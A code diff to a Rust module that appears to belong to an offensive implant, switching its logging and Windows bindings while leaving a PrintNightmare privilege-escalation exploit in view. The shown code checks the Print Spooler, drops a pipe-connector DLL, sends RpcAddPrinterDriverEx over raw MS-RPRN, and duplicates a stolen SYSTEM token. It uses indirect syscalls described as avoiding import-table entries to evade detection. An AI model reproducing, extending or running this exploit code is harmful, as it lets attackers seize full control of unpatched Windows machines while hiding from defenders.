@@ -28,7 +28,7 @@
 //! All NT API calls use indirect syscalls — no IAT entries.
 
 use anyhow::{anyhow, Context, Result};
-use winapi::um::winnt::HANDLE;
+use crate::win_types::HANDLE;
 
 // ── NTSTATUS helpers ───────────────────────────────────────────────────────
 
@@ -183,15 +183,15 @@ fn is_spooler_running() -> bool {
 ///
 /// Returns `true` if the system appears vulnerable.
 pub fn check_spooler_vulnerability() -> Result<bool> {
-    log::info!("lpe/print_spooler: checking Print Spooler vulnerability state");
+    tracing::info!("lpe/print_spooler: checking Print Spooler vulnerability state");
 
     // Check 1: Is the spooler process running?
     if !is_spooler_running() {
-        log::info!("lpe/print_spooler: spoolsv.exe is not running");
+        tracing::info!("lpe/print_spooler: spoolsv.exe is not running");
         return Ok(false);
     }
 
-    log::debug!("lpe/print_spooler: spoolsv.exe is running");
+    tracing::debug!("lpe/print_spooler: spoolsv.exe is running");
 
     // Check 2: Can we open the spooler named pipe?
     // The Print Spooler listens on \\.\pipe\spoolss.
@@ -256,11 +256,11 @@ pub fn check_spooler_vulnerability() -> Result<bool> {
     };
 
     if !pipe_accessible {
-        log::info!("lpe/print_spooler: spoolss pipe not accessible");
+        tracing::info!("lpe/print_spooler: spoolss pipe not accessible");
         return Ok(false);
     }
 
-    log::debug!("lpe/print_spooler: spoolss pipe is accessible");
+    tracing::debug!("lpe/print_spooler: spoolss pipe is accessible");
 
     // Check 3: Check Windows build number to estimate patch level.
     // PrintNightmare was patched in:
@@ -275,7 +275,7 @@ pub fn check_spooler_vulnerability() -> Result<bool> {
         build
     };
 
-    log::debug!("lpe/print_spooler: Windows build number {build_number}");
+    tracing::debug!("lpe/print_spooler: Windows build number {build_number}");
 
     // If build >= 19043, assume potentially patched (but may still be vulnerable
     // if the patch is not installed).  For builds < 19043, assume vulnerable.
@@ -284,7 +284,7 @@ pub fn check_spooler_vulnerability() -> Result<bool> {
     // Point and Print misconfigurations, so we return true if the spooler
     // is running and the pipe is accessible, with a warning about patch state.
     if build_number >= 19043 {
-        log::warn!(
+        tracing::warn!(
             "lpe/print_spooler: build {} >= 19043 — system may be patched against PrintNightmare \
              but spooler is accessible; exploitation may still succeed via Point and Print",
             build_number
@@ -320,7 +320,7 @@ pub fn check_spooler_vulnerability() -> Result<bool> {
 ///
 /// A duplicated SYSTEM impersonation token on success.
 pub fn exploit_printnightmare(_ca_cert: Option<&[u8]>) -> Result<HANDLE> {
-    log::info!("lpe/print_spooler: starting PrintNightmare exploitation");
+    tracing::info!("lpe/print_spooler: starting PrintNightmare exploitation");
 
     let vulnerable =
         check_spooler_vulnerability().context("failed to check spooler vulnerability")?;
@@ -345,7 +345,7 @@ pub fn exploit_printnightmare(_ca_cert: Option<&[u8]>) -> Result<HANDLE> {
     };
 
     let pipe_name = format!(r"\\.\pipe\orch_pn_{}", pid);
-    log::debug!("lpe/print_spooler: creating pipe {}", pipe_name);
+    tracing::debug!("lpe/print_spooler: creating pipe {}", pipe_name);
     let pipe_handle = create_permissive_pipe(&pipe_name)?;
 
     // ── 2. Generate pipe-connector DLL ───────────────────────────────────
@@ -449,10 +449,10 @@ pub fn exploit_printnightmare(_ca_cert: Option<&[u8]>) -> Result<HANDLE> {
     }
 
     // ── 5. Call RpcAddPrinterDriverEx via raw MS-RPRN over the spoolss pipe
-    log::debug!("lpe/print_spooler: sending RpcAddPrinterDriverEx via MS-RPRN");
+    tracing::debug!("lpe/print_spooler: sending RpcAddPrinterDriverEx via MS-RPRN");
     let rpc_result = invoke_ms_rprn_add_driver(&dll_path_wide);
     if let Err(e) = rpc_result {
-        log::warn!("lpe/print_spooler: RPC call failed ({e:#}), DLL may still be loaded");
+        tracing::warn!("lpe/print_spooler: RPC call failed ({e:#}), DLL may still be loaded");
     }
 
     // ── 6. Wait for impersonation (up to 30 seconds) ─────────────────────
@@ -475,9 +475,8 @@ pub fn exploit_printnightmare(_ca_cert: Option<&[u8]>) -> Result<HANDLE> {
 
     // ── 7. Extract token ─────────────────────────────────────────────────
     let token_result = if got_connection {
-        use winapi::um::winnt::{
-            TokenImpersonation, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY,
-        };
+        use windows_sys::Win32::Security::{TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY};
+        use windows_sys::Win32::Security::TokenImpersonation;
         let token = unsafe {
             // NtOpenThreadToken on the impersonation thread
             let mut tok: HANDLE = std::ptr::null_mut();
@@ -500,11 +499,11 @@ pub fn exploit_printnightmare(_ca_cert: Option<&[u8]>) -> Result<HANDLE> {
         };
 
         let dup_result = unsafe {
-            use winapi::um::winnt::SECURITY_QUALITY_OF_SERVICE;
+            use windows_sys::Win32::Security::SECURITY_QUALITY_OF_SERVICE;
             let mut new_token: HANDLE = std::ptr::null_mut();
             let mut sqos: SECURITY_QUALITY_OF_SERVICE = std::mem::zeroed();
             sqos.Length = std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32;
-            sqos.ImpersonationLevel = winapi::um::winnt::SecurityImpersonation as u32;
+            sqos.ImpersonationLevel = windows_sys::Win32::Security::SecurityImpersonation as u32;
             let target = crate::syscalls::get_syscall_id("NtDuplicateToken")
                 .map_err(|e| anyhow!("NtDuplicateToken: {e}"))?;
             let st = crate::syscalls::do_syscall(
@@ -543,11 +542,11 @@ pub fn exploit_printnightmare(_ca_cert: Option<&[u8]>) -> Result<HANDLE> {
 
     match token_result {
         Ok(tok) => {
-            log::info!("lpe/print_spooler: PrintNightmare succeeded — SYSTEM token obtained");
+            tracing::info!("lpe/print_spooler: PrintNightmare succeeded — SYSTEM token obtained");
             Ok(tok)
         }
         Err(e) => {
-            log::warn!("lpe/print_spooler: PrintNightmare failed: {e:#}");
+            tracing::warn!("lpe/print_spooler: PrintNightmare failed: {e:#}");
             Err(e)
         }
     }
@@ -989,7 +988,7 @@ fn write_dll_to_temp(dll_bytes: &[u8], pid: u32) -> Result<Vec<u16>> {
         ));
     }
 
-    log::debug!("lpe/print_spooler: DLL written to {}", dll_path_a);
+    tracing::debug!("lpe/print_spooler: DLL written to {}", dll_path_a);
 
     // Return path as wide string (null-terminated) for use in RPC call
     let wide: Vec<u16> = dll_path_a
@@ -1282,7 +1281,7 @@ fn invoke_ms_rprn_add_driver(dll_path_wide: &[u16]) -> Result<()> {
         // ptype=3 = FAULT
         Err(anyhow!("MS-RPRN RpcAddPrinterDriverEx returned FAULT"))
     } else {
-        log::debug!(
+        tracing::debug!(
             "lpe/print_spooler: RpcAddPrinterDriverEx dispatched ({} byte response)",
             resp.len()
         );
